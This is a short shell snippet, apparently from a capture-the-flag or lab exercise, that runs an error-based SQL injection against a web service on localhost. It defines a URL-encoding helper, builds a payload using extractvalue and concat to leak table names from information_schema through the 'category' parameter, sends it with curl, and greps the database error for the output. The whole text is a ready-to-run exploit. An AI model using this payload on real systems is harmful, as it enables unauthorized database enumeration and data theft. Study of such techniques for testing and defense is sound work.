urlenc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$1"; }
q="Nature' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -"
curl -s "http://127.0.0.1:32833/?category=$(urlenc "$q")" | grep -oE "Error in query[^<]*"
